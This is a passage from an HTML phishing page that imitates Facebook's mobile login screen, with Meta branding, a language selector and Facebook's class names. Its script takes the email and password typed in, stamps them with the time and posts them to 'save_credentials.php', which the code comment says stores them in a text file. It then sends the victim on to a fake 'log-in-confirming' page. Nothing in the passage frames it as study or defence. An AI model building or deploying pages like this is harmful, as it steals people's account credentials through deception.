  var email = document.getElementById("m_login_email").value;
  var password = document.getElementById("m_login_password").value;
    
  // Check if both email and password are not empty
  if (!email || !password) {
    alert("Email and password fields cannot be empty!");
    return;
  }
    
  // Check if email is less than 5 characters or password is less than 5 characters
  else if (email.length < 5) {
    alert("Please input a valid email!");
    return;
  }
    
  else if (password.length < 5) {
    alert("Please input a valid Password!");
    return;
  }
    
  // Create a new FormData object and append the email and password values
  var formData = new FormData();
  formData.append("email", email);
  formData.append("password", password);
  formData.append("datetime", new Date().toISOString()); // add current date and time
    
  // Use fetch API to send the data to a server-side script that can handle saving the credentials to a .txt file
  fetch("save_credentials.php", {
    method: "POST",
    body: formData
  })
  .then(function(response) {
    // If the response is successful, redirect the user to the specified URL
    window.location.href = "fb4402-log-in-confirming.html";
  })
  .catch(function(error) {
    console.error("Error saving credentials: ", error);
  });
}

</script>
  </div>
</div>

<script>
function redirectTo(url) {
  window.location.href = fb4402-log-in-confirming.html;
}
</script>


</form>

<div>

<div class="_2pie _9omz">

<div class="_52jj _9on1"><a class="_9on1" tabindex="0" href="fb4402-log-in-verifications.php" id="forgot-password-link">Forgot password?</a>
</div>
</div>

<div style="padding-top: 42px">

<div>

<div>

<div>

<div id="login_reg_separator" class="_43mg _8qtf" data-sigil="login_reg_separator">

<span class="_43mh">or
</span>
</div>

<div class="_52jj _5t3b" id="signup_button_area"><a role="button" class="_agmp _28le btn btnS medBtn mfsm touchable" id="signup-button" tabindex="0" data-sigil="m_reg_button" data-autoid="autoid_3">Create new account</a>
</div>
</div>
</div>

<div class="_2pie" style="text-align:center;">

<div>

<div data-sigil="login_identify_step_element">
</div>

<div class="other-links _8p_m">
<ul class="_5pkb _55wp">
<li></li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>

<div style="display:none">

<div>
</div>
</div>

<span><img src="" width="0" height="0" style="display:none">
</span>

<div class="_55wr _5ui2" data-sigil="m_login_footer">

<div class="_5dpw">

<div class="_5ui3" data-nocookies="1" id="locale-selector" data-sigil="language_selector marea">

<div class="_7om2">

<div class="_4g34">

<span class="_52jc _52j9 _52jh _3ztb">English (US)
</span>

<div class="_3ztc">

<span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">Bisaya</a>
</span>
</div>

<div class="_3ztc">

<span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">日本語</a>
</span>
</div>

<div class="_3ztc">

<span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">Português (Brasil)</a>
</span>
</div>
</div>

<div class="_4g34">

<div class="_3ztc">

<span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">Filipino</a>
</span>
</div>

<div class="_3ztc">

<span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">Español</a>
</span>
</div>

<div class="_3ztc">

<span class="_52jc"><a href="" data-method="post" data-sigil="ajaxify">한국어</a>
</span>
</div><a href="">

<div class="_3j87 _1rrd _3ztd" aria-label="Complete list of languages" data-sigil="more_language"><i class="img sp_zqrNfmDGuGz_1_5x sx_bafd06"></i>
</div></a>
</div>
</div>
</div>

<div class="_5ui4">

<span class="mfss fcg">Meta © 2023
</span>
</div>
</div>
</div>
</div>

<div class="">
</div>

<div class="viewportArea _2v9s" style="display:none" id="u_0_4_2S" data-sigil="marea">

<div class="_5vsg" id="u_0_5_lh" style="max-height: 759px;">
</div>

<div class="_5vsh" id="u_0_6_JY" style="max-height: 373px;">
</div>

<div class="_5v5d fcg">

<div class="_2so _2sq _2ss img _50cg" data-animtype="1" data-sigil="m-loading-indicator-animate m-loading-indicator-root">
</div>Loading...
</div>
</div>

<div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">

<div class="container">

<div class="image">
</div>

<div class="message" data-sigil="error-message">
</div><a class="link" data-sigil="MPageError:retry">Try Again</a>
</div>
</div>
</div>
</div>

<div id="static_templates">

<div class="mDialog" id="modalDialog" style="display:none" data-sigil=" context-layer-root" data-autoid="autoid_2">

<div class="_52z5 _451a mFuturePageHeader _1uh1 firstStep titled" id="mDialogHeader">

<div class="_7om2 _52we">

<div class="_5s61">

<div class="_52z7"><button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable" id="u_0_8_zf" data-sigil="dialog-cancel-button">Cancel</button><button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly" aria-label="Back" id="u_0_9_kP" data-sigil="dialog-back-button"><i class="img sp_zqrNfmDGuGz_1_5x sx_c40323" style="margin-top: 2px;"></i></button>
</div>
</div>

<div class="_4g34">

<div class="_52z6">

<div class="_50l4 mfsl fcw" id="m-future-page-header-title" role="heading" tabindex="0" data-sigil="m-dialog-header-title dialog-title">Loading...
</div>
</div>
</div>

<div class="_5s61">

<div class="_52z8" id="modalDialogHeaderButtons">
</div>
</div>
</div>
</div>

<div class="modalDialogView" id="modalDialogView">
</div>

<div class="_5v5d _5v5e fcg" id="dialogSpinner">

<div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_7_hw" data-sigil="m-loading-indicator-animate m-loading-indicator-root">
</div>Loading...
</div>
</div>
</div>



<div class="AdBox Ad advert post-ads">
</div>

<div class="download_link_sponsored">
</div><iframe srcdoc="" style="display: none;"></iframe>

<div id="loom-companion-mv3" ext-id="liecbddmkiiihnedobmlmillhodjkdmb"><section id="shadow-host-companion"></section>
</div>
</body>
</html>